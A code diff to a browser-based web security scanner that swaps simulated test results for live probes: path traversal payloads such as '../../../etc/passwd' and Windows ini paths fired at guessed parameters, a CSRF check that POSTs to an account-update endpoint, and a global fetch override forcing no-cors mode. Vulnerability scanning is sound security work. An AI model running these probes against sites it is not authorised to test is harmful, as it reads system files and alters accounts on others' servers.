@@ -1,3 +1,13 @@
+
+// Overwrite fetch globally (use with caution)
+(function() {
+    const originalFetch = window.fetch;
+    window.fetch = function(input, init = {}) {
+      init.mode = 'no-cors';
+      return originalFetch(input, init);
+    };
+})();
+  
 document.addEventListener('DOMContentLoaded', () => {
     initializeApp();
 });
@@ -213,12 +223,163 @@ async function testSQLi(url) {
 async function testPathTraversal(url) {
     logMessage('Testing for path traversal vulnerabilities...', 'info');
     try {
-        await simulateTest(300);
-        const passed = Math.random() > 0.2;
+        // Parse the URL to get base components
+        const parsedUrl = new URL(url);
+        const baseUrl = `${parsedUrl.protocol}//${parsedUrl.host}`;
+        
+        // Common path traversal payloads
+        const payloads = [
+            '../../../etc/passwd',
+            '..%2f..%2f..%2fetc%2fpasswd',
+            '....//....//....//etc/passwd',
+            '%252e%252e%252fetc%252fpasswd',
+            'file:///etc/passwd',
+            '/var/log/apache2/access.log',
+            'C:\\Windows\\system.ini',
+            '..\\..\\..\\windows\\win.ini'
+        ];
+        
+        // Target parameters to test - common places where path traversal occurs
+        const paramTargets = ['file', 'path', 'document', 'load', 'read', 'retrieve', 'doc'];
+        
+        // Identify potential vulnerable endpoints from the main page
+        const mainResponse = await fetch(baseUrl, {
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Security Scanner'
+            }
+        });
+        
+        const html = await mainResponse.text();
+        
+        // Extract potential file-related endpoints
+        const fileEndpoints = [];
+        const hrefMatches = html.match(/href=["'](.*?)["']/g) || [];
+        const srcMatches = html.match(/src=["'](.*?)["']/g) || [];
+        
+        // Process and extract actual URLs
+        [...hrefMatches, ...srcMatches].forEach(match => {
+            const extractedUrl = match.replace(/href=["']|src=["']/g, '').replace(/["']/g, '');
+            if (extractedUrl.includes('.') && !extractedUrl.startsWith('http')) {
+                fileEndpoints.push(extractedUrl);
+            }
+        });
+        
+        // Function to check response for path traversal success indicators
+        const checkForPathTraversalSuccess = async (response) => {
+            const content = await response.text();
+            
+            // Look for common indicators of successful path traversal
+            const unixSuccess = content.includes('root:') && content.includes('/bin/bash');
+            const windowsSuccess = content.includes('[fonts]') || content.includes('MSWINCFG');
+            const logfileSuccess = content.includes('GET /') && content.includes('HTTP/1.');
+            const directorySuccess = content.includes('Directory of') || content.includes('Index of');
+            
+            return unixSuccess || windowsSuccess || logfileSuccess || directorySuccess;
+        };
+        
+        // Test results storage
+        let vulnerabilities = [];
+        
+        // Test URL parameters that could be vulnerable
+        for (const param of paramTargets) {
+            for (const payload of payloads) {
+                const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
+                
+                const response = await fetch(testUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Security Scanner'
+                    },
+                    // Don't follow redirects to avoid potential server-side impacts
+                    redirect: 'manual'
+                });
+                
+                if (response.status === 200) {
+                    const isVulnerable = await checkForPathTraversalSuccess(response);
+                    if (isVulnerable) {
+                        vulnerabilities.push({
+                            url: testUrl,
+                            payload: payload,
+                            parameter: param
+                        });
+                    }
+                }
+            }
+        }
+        
+        // Test identified file endpoints
+        for (const endpoint of fileEndpoints) {
+            for (const payload of payloads) {
+                // Determine injection point (if endpoint has parameters, inject into them)
+                let testUrl;
+                if (endpoint.includes('?') && endpoint.includes('=')) {
+                    const [path, queryString] = endpoint.split('?');
+                    const params = new URLSearchParams(queryString);
+                    
+                    // Try injecting into each parameter
+                    for (const [key, value] of params.entries()) {
+                        params.set(key, payload);
+                        testUrl = `${baseUrl}${path}?${params.toString()}`;
+                        
+                        const response = await fetch(testUrl, {
+                            method: 'GET',
+                            headers: {
+                                'User-Agent': 'Security Scanner'
+                            },
+                            redirect: 'manual'
+                        });
+                        
+                        if (response.status === 200) {
+                            const isVulnerable = await checkForPathTraversalSuccess(response);
+                            if (isVulnerable) {
+                                vulnerabilities.push({
+                                    url: testUrl,
+                                    payload: payload,
+                                    parameter: key
+                                });
+                            }
+                        }
+                    }
+                } else {
+                    // Try path injection
+                    testUrl = `${baseUrl}/${endpoint.replace(/\.[^/.]+$/, '')}/${payload}`;
+                    
+                    const response = await fetch(testUrl, {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': 'Security Scanner'
+                        },
+                        redirect: 'manual'
+                    });
+                    
+                    if (response.status === 200) {
+                        const isVulnerable = await checkForPathTraversalSuccess(response);
+                        if (isVulnerable) {
+                            vulnerabilities.push({
+                                url: testUrl,
+                                payload: payload,
+                                parameter: 'path'
+                            });
+                        }
+                    }
+                }
+            }
+        }
+        
+        const passed = vulnerabilities.length === 0;
+        
         return {
             passed,
-            message: passed ? 'File paths validated.' : 'Path traversal risk detected.',
-            severity: 'high'
+            message: passed ? 
+                'No path traversal vulnerabilities detected.' : 
+                `Path traversal vulnerability detected in ${vulnerabilities.length} locations.`,
+            severity: passed ? 'info' : 'high',
+            details: {
+                vulnerabilities,
+                testedEndpoints: fileEndpoints.length,
+                testedPayloads: payloads.length
+            }
         };
     } catch (error) {
         throw new Error(`Path traversal test failed: ${error.message}`);
@@ -243,14 +404,71 @@ async function testFileUpload(url) {
 async function testCSRF(url) {
     logMessage('Testing for CSRF protections...', 'info');
     try {
-        await simulateTest(400);
-        const passed = Math.random() > 0.4;
+        // First, make a GET request to the site to get cookies and locate a form
+        const response = await fetch(url, {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+                'Accept': 'text/html',
+                'User-Agent': 'Security Scanner'
+            }
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Failed to access site: ${response.status}`);
+        }
+        
+        const html = await response.text();
+        const cookies = response.headers.get('set-cookie');
+        
+        // Check for CSRF token in the page
+        const hasCSRFTokenInHTML = html.includes('csrf') || 
+                                   html.includes('_token') || 
+                                   html.match(/input.*?(csrf|token|nonce)/i);
+        
+        // Attempt a state-changing request without a proper CSRF token
+        // Using a common endpoint that typically requires CSRF protection
+        const targetUrl = new URL('/api/account/update', url).toString();
+        const csrfTestResponse = await fetch(targetUrl, {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'Cookie': cookies || '',
+                'Origin': url,
+                'Referer': url
+            },
+            body: JSON.stringify({
+                'name': 'CSRF Test'
+            })
+        });
+        
+        // Check the response for indicators of CSRF protection
+        const passed = (
+            // If 403 Forbidden or 401 Unauthorized, likely has CSRF protection
+            csrfTestResponse.status === 403 || 
+            csrfTestResponse.status === 401 ||
+            // Or if page required a token and we couldn't modify
+            (hasCSRFTokenInHTML && csrfTestResponse.status !== 200)
+        );
+        
+        // Determine severity based on whether it's a sensitive endpoint
+        const severity = passed ? 'info' : 'high';
+        
         return {
             passed,
-            message: passed ? 'CSRF tokens implemented.' : 'Missing CSRF tokens.',
-            severity: 'high'
+            message: passed ? 
+                'CSRF protection appears to be implemented correctly.' : 
+                'Potentially vulnerable to CSRF attacks. No token validation detected.',
+            severity,
+            details: {
+                tokenFound: hasCSRFTokenInHTML,
+                responseStatus: csrfTestResponse.status,
+                testedUrl: targetUrl
+            }
         };
     } catch (error) {
+        // Provide detailed error message
         throw new Error(`CSRF test failed: ${error.message}`);
     }
 }
